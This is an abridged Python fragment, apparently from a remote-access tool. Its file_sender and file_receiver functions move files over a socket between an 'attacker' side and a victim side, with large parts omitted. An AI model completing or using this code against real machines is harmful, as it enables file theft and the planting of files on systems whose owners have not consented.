...
def file_sender(send_socket, attacker):
    ...
    if attacker:
        ...
        if not os.path.isfile(file_path):
            send_socket.send("Not Found".encode("utf-8"))
            print("Not Found.")
            return
        else:
            save_path = input("( TO )--> ")
            send_socket.send(save_path.encode("utf-8"))
            exist_path = send_socket.recv(4096).decode("utf-8")
            if exist_path == "False":
                return

    else:
        file_path = send_socket.recv(4096).decode("utf-8")
        if os.path.isfile(file_path):
            send_socket.send("True".encode("utf-8"))
        else:
            send_socket.send("False".encode("utf-8"))
            return

        save_path = send_socket.recv(4096).decode("utf-8")
        if save_path == "False":
            return
...
def file_receiver(receive_socket, attacker):
    ...
    if attacker:
        file_path = input("(FROM)--> ")
        receive_socket.send(file_path.encode("utf-8"))

        exist_path = receive_socket.recv(4096).decode("utf-8")
        if exist_path != "True":
            print("Not Found.")
            return
        else:
            ...
            if os.path.isdir(head):
                receive_socket.send("True".encode("utf-8"))
            else:
                receive_socket.send("False".encode("utf-8"))
                print("Not Found.")
                return
    else:
        save_path = receive_socket.recv(4096).decode("utf-8")
